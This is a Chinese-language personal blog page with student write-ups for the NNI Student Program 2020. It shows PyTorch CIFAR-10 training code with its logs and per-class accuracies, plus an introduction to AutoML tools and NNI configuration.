<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>) <span class="comment"># -1 means uncertain number</span></span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而训练过程中，使用PyTorch的写法是这样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">trainloader, path</span>):</span></span><br><span class="line">    neuralnet = NeuralNet()</span><br><span class="line">    criterion = nn.CrossEntropyLoss()</span><br><span class="line">    optimizer = optim.SGD(neuralnet.parameters(), lr=<span class="number">0.001</span>, momentum=<span class="number">0.9</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        running_loss = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(trainloader, <span class="number">0</span>):</span><br><span class="line">            inputs, labels = data</span><br><span class="line">            <span class="comment"># training template for PyTorch</span></span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = neuralnet(inputs)</span><br><span class="line">            loss = criterion(outputs, labels)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">            running_loss += loss.item()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2000</span> == <span class="number">1999</span>:</span><br><span class="line">                print(<span class="string">&#x27;[%5d, %5d] loss = %.5f&#x27;</span> % (epoch + <span class="number">1</span>, i + <span class="number">1</span>, running_loss / <span class="number">2000</span>))</span><br><span class="line">                running_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    torch.save(neuralnet.state_dict(), path)</span><br><span class="line">    print(<span class="string">&#x27;Training Finished&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><p>经10个epoch的训练，最终输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12058\anaconda3\python.exe C:&#x2F;Users&#x2F;12058&#x2F;Documents&#x2F;GitHub&#x2F;nni-learning&#x2F;task2&#x2F;2.1&#x2F;main.py</span><br><span class="line">[    1,  2000] loss &#x3D; 2.16590</span><br><span class="line">[    1,  4000] loss &#x3D; 1.82480</span><br><span class="line">[    1,  6000] loss &#x3D; 1.64638</span><br><span class="line">[    1,  8000] loss &#x3D; 1.56156</span><br><span class="line">[    1, 10000] loss &#x3D; 1.49378</span><br><span class="line">[    1, 12000] loss &#x3D; 1.46539</span><br><span class="line">[    2,  2000] loss &#x3D; 1.39108</span><br><span class="line">[    2,  4000] loss &#x3D; 1.38308</span><br><span class="line">[    2,  6000] loss &#x3D; 1.36254</span><br><span class="line">[    2,  8000] loss &#x3D; 1.30314</span><br><span class="line">[    2, 10000] loss &#x3D; 1.30563</span><br><span class="line">[    2, 12000] loss &#x3D; 1.26935</span><br><span class="line">[    3,  2000] loss &#x3D; 1.21411</span><br><span class="line">[    3,  4000] loss &#x3D; 1.21809</span><br><span class="line">[    3,  6000] loss &#x3D; 1.17786</span><br><span class="line">[    3,  8000] loss &#x3D; 1.18651</span><br><span class="line">[    3, 10000] loss &#x3D; 1.16956</span><br><span class="line">[    3, 12000] loss &#x3D; 1.16728</span><br><span class="line">[    4,  2000] loss &#x3D; 1.10504</span><br><span class="line">[    4,  4000] loss &#x3D; 1.11141</span><br><span class="line">[    4,  6000] loss &#x3D; 1.07836</span><br><span class="line">[    4,  8000] loss &#x3D; 1.10194</span><br><span class="line">[    4, 10000] loss &#x3D; 1.07333</span><br><span class="line">[    4, 12000] loss &#x3D; 1.06928</span><br><span class="line">[    5,  2000] loss &#x3D; 0.98897</span><br><span class="line">[    5,  4000] loss &#x3D; 1.01186</span><br><span class="line">[    5,  6000] loss &#x3D; 1.01296</span><br><span class="line">[    5,  8000] loss &#x3D; 1.01628</span><br><span class="line">[    5, 10000] loss &#x3D; 1.02610</span><br><span class="line">[    5, 12000] loss &#x3D; 1.03693</span><br><span class="line">[    6,  2000] loss &#x3D; 0.94843</span><br><span class="line">[    6,  4000] loss &#x3D; 0.94470</span><br><span class="line">[    6,  6000] loss &#x3D; 0.96298</span><br><span class="line">[    6,  8000] loss &#x3D; 0.96035</span><br><span class="line">[    6, 10000] loss &#x3D; 0.98843</span><br><span class="line">[    6, 12000] loss &#x3D; 0.96657</span><br><span class="line">[    7,  2000] loss &#x3D; 0.87795</span><br><span class="line">[    7,  4000] loss &#x3D; 0.90013</span><br><span class="line">[    7,  6000] loss &#x3D; 0.91402</span><br><span class="line">[    7,  8000] loss &#x3D; 0.94256</span><br><span class="line">[    7, 10000] loss &#x3D; 0.93912</span><br><span class="line">[    7, 12000] loss &#x3D; 0.91624</span><br><span class="line">[    8,  2000] loss &#x3D; 0.84444</span><br><span class="line">[    8,  4000] loss &#x3D; 0.85796</span><br><span class="line">[    8,  6000] loss &#x3D; 0.90461</span><br><span class="line">[    8,  8000] loss &#x3D; 0.89855</span><br><span class="line">[    8, 10000] loss &#x3D; 0.89341</span><br><span class="line">[    8, 12000] loss &#x3D; 0.89116</span><br><span class="line">[    9,  2000] loss &#x3D; 0.79060</span><br><span class="line">[    9,  4000] loss &#x3D; 0.83296</span><br><span class="line">[    9,  6000] loss &#x3D; 0.84468</span><br><span class="line">[    9,  8000] loss &#x3D; 0.85216</span><br><span class="line">[    9, 10000] loss &#x3D; 0.86738</span><br><span class="line">[    9, 12000] loss &#x3D; 0.87915</span><br><span class="line">[   10,  2000] loss &#x3D; 0.76653</span><br><span class="line">[   10,  4000] loss &#x3D; 0.80672</span><br><span class="line">[   10,  6000] loss &#x3D; 0.82791</span><br><span class="line">[   10,  8000] loss &#x3D; 0.80691</span><br><span class="line">[   10, 10000] loss &#x3D; 0.83649</span><br><span class="line">[   10, 12000] loss &#x3D; 0.84138</span><br><span class="line">Training Finished</span><br><span class="line">Accuracy of plane: 81.14%</span><br><span class="line">Accuracy of car: 92.10%</span><br><span class="line">Accuracy of bird: 74.58%</span><br><span class="line">Accuracy of cat: 47.94%</span><br><span class="line">Accuracy of deer: 65.08%</span><br><span class="line">Accuracy of dog: 61.28%</span><br><span class="line">Accuracy of frog: 71.88%</span><br><span class="line">Accuracy of horse: 73.24%</span><br><span class="line">Accuracy of ship: 86.18%</span><br><span class="line">Accuracy of truck: 66.52%</span><br><span class="line">Testing Finished</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看出，损失值总体稳定下降，对车、飞机、船等图像分类准确率较高，而对猫、狗、卡车等图像的准确率较不理想。</p>
<p>如何提高部分不理想的分类准确率？请看Task 2.2……</p>
<h2 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h2><p>to be continued…</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/08/NNI-Student-Program-2020-Task1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/08/NNI-Student-Program-2020-Task1/" class="post-title-link" itemprop="url">NNI Student Program 2020 Task1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-08 19:46:45 / Modified: 21:52:00" itemprop="dateCreated datePublished" datetime="2021-01-08T19:46:45+08:00">2021-01-08</time>
            </span>

          
            <span id="/2021/01/08/NNI-Student-Program-2020-Task1/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program 2020 Task1" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/08/NNI-Student-Program-2020-Task1/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/08/NNI-Student-Program-2020-Task1/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task-1-入门任务"><a href="#Task-1-入门任务" class="headerlink" title="Task 1 入门任务"></a>Task 1 入门任务</h1><h2 id="NNI-体验文档"><a href="#NNI-体验文档" class="headerlink" title="NNI 体验文档"></a>NNI 体验文档</h2><h3 id="1-AutoML-工具比较"><a href="#1-AutoML-工具比较" class="headerlink" title="1. AutoML 工具比较"></a>1. AutoML 工具比较</h3><p>机器学习算法与模型的选择，对机器学习十分重要，一个成功的选择，能够成倍提高训练效率，从而提高模型准确度，减少损失，产生更大的效益。</p>
<p>但算法与模型的选择并不简单。就算是数据科学家，也需要花费大量的时间用于尝试与权衡不同模型的优劣，最终才能得出理想的结果。超参的调参过程中也经常造成算力的浪费。</p>
<p>自动机器学习（AutoML）是一套自动化的机器学习应用工具，旨在用自动化工具完成特征工程、自动调参等优化工作。</p>
<p>当前，自动机器学习平台早已问世，下面介绍几个著名的AutoML工具，并列出优缺点，以供比较。</p>
<h4 id="auto-sklearn"><a href="#auto-sklearn" class="headerlink" title="auto-sklearn"></a>auto-sklearn</h4><p>auto-sklearn是GitHub上开源的一个基于sklearn的自动机器学习工具，目前已获得5.1k个星。</p>
<p>优点：可限制训练时间，支持切分训练集和测试集，支持交叉验证。</p>
<p>缺点：输出信息较少，优化算法单一。</p>
<h4 id="Google-Cloud-AutoML"><a href="#Google-Cloud-AutoML" class="headerlink" title="Google Cloud AutoML"></a>Google Cloud AutoML</h4><p>Google Cloud AutoML基于高精度的深度神经网络而设计，可用于图像分类、自然语言处理、语音翻译等。</p>
<p>优点：具有较完整的谷歌ML生态链，Tensorflow+Colab+Cloud AutoML共同使用时非常方便。</p>
<p>优点：具有完整图形界面，对新手用户友好，同时提供API调用，分类详尽。</p>
<p>缺点：完整版需付费，访问需科学上网。</p>
<h4 id="Microsoft-NNI"><a href="#Microsoft-NNI" class="headerlink" title="Microsoft NNI"></a>Microsoft NNI</h4><p>NNI(Neural Network Intelligence)是微软亚洲研究院开源的自动机器学习工具，面向研究人员和算法工程师而设计，2018年9月问世，目前已经更新至v1.9。</p>
<p>优点：具有多平台支持，可命令行操作，支持结果可视化。内置优化算法多，扩展性强，支持远程调用进行集群训练。</p>
<p>缺点：暂未发现</p>
<p>更详细的对比：</p>
<p><img data-src="https://www.msra.cn/wp-content/uploads/2019/12/nni-2.png" alt></p>
<p>（摘自MSRA官网）</p>
<h3 id="2-NNI-安装及使用"><a href="#2-NNI-安装及使用" class="headerlink" title="2. NNI 安装及使用"></a>2. NNI 安装及使用</h3><p>NNI的安装非常简单，只需一行命令即可安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install --upgrade nni</span><br></pre></td></tr></table></figure>
<p>本人强烈推荐将nni安装在Anaconda的环境中，可通过在PyCharm中设置Python解释器，实现对NNI的调用。</p>
<p>使用NNI，需要在原有神经网络代码的基础上做出些许修改：</p>
<ol>
<li>通过nni模块获得参数</li>
<li>向nni报告中间结果</li>
<li>向nni报告最终结果</li>
</ol>
<p>修改好代码并且准备好搜索空间和配置文件后，就可以通过一行命令开始使用NNI：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nnictl create --config your-config.yml</span><br></pre></td></tr></table></figure>
<p>具体会在下述代码部分进行解释。</p>
<h3 id="3-NNI-使用感受"><a href="#3-NNI-使用感受" class="headerlink" title="3. NNI 使用感受"></a>3. NNI 使用感受</h3><p>NNI易于安装，易于使用，有一套完善的命令行控制工具，也有结果可视化界面，对机器学习实验与研究提供了巨大的便利。</p>
<p>本人大一，尚未接触过多机器学习知识，但通过在本地跑通多个样例后，能感受到NNI在机器学习方面的威力，希望未来能够掌握NNI，方便未来的研究与学习。</p>
<h2 id="NNI-样例分析文档"><a href="#NNI-样例分析文档" class="headerlink" title="NNI 样例分析文档"></a>NNI 样例分析文档</h2><h3 id="配置文件：config-windows-yml"><a href="#配置文件：config-windows-yml" class="headerlink" title="配置文件：config_windows.yml"></a>配置文件：config_windows.yml</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">authorName: default</span><br><span class="line">experimentName: example_mnist_pytorch</span><br><span class="line">trialConcurrency: 1</span><br><span class="line">maxExecDuration: 2h</span><br><span class="line">maxTrialNum: 10</span><br><span class="line">#choice: local, remote, pai</span><br><span class="line">trainingServicePlatform: local</span><br><span class="line">searchSpacePath: search_space.json</span><br><span class="line">#choice: true, false</span><br><span class="line">useAnnotation: false</span><br><span class="line">tuner:</span><br><span class="line">  #choice: TPE, Random, Anneal, Evolution, BatchTuner, MetisTuner, GPTuner</span><br><span class="line">  #SMAC (SMAC should be installed through nnictl)</span><br><span class="line">  builtinTunerName: TPE</span><br><span class="line">  classArgs:</span><br><span class="line">    #choice: maximize, minimize</span><br><span class="line">    optimize_mode: maximize</span><br><span class="line">trial:</span><br><span class="line">  command: python mnist.py</span><br><span class="line">  codeDir: .</span><br><span class="line">  gpuNum: 0</span><br></pre></td></tr></table></figure>
<h3 id="搜索空间：search-space-json"><a href="#搜索空间：search-space-json" class="headerlink" title="搜索空间：search_space.json"></a>搜索空间：search_space.json</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;batch_size&quot;</span>: &#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>: [<span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;hidden_size&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">128</span>, <span class="number">256</span>, <span class="number">512</span>, <span class="number">1024</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0.0001</span>, <span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;momentum&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;uniform&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0</span>, <span class="number">1</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码部分只需要在原有PyTorch代码上进行些许修改。</p>
<ol>
<li>参数选择无需在程序中给定，而是通过nni获得：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tuner_params = nni.get_next_parameter()</span><br></pre></td></tr></table></figure></li>
<li>在每个epoch学习完成后，报告中间结果：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nni.report_intermediate_result(test_acc)</span><br></pre></td></tr></table></figure></li>
<li>在训练完整结束后，报告最终结果：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nni.report_final_result(test_acc)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>如图，10次trial都成功地完成，其中id为9的trial达到了最高准确率，达99.34%。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/1.png">

<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/4.png">

<h4 id="超参组合可视化"><a href="#超参组合可视化" class="headerlink" title="超参组合可视化"></a>超参组合可视化</h4><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/5.png">

<p>图中，准确率更高的组合用红线表示，而准确率低的用绿线表示。</p>
<p>可以看出，当batch_size选择16，lr和momentum大小适中时，模型可以达到99%以上的准确率，实验效果非常理想。</p>
<h4 id="训练结果可视化"><a href="#训练结果可视化" class="headerlink" title="训练结果可视化"></a>训练结果可视化</h4><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/3.png">

<p>Default Metric</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/2.png">

<p>Sorted Default Metric</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/6.png">

<p>Trial Duration</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/7.png">

<p>Intermediate Results</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Garen Wang"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Garen Wang</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Garen-Wang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Garen-Wang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:garen-wang@qq.com" title="E-Mail → mailto:garen-wang@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备2021003110号 </a>
      <img src="/images/beian.png" style="display: inline-block;">
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Garen Wang</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : true,
      appId      : 'wMExYSieDga8BTVjfcUnCRh1-gzGzoHsz',
      appKey     : 'pYUGXalVN490u6EsT2HJA4Rj',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
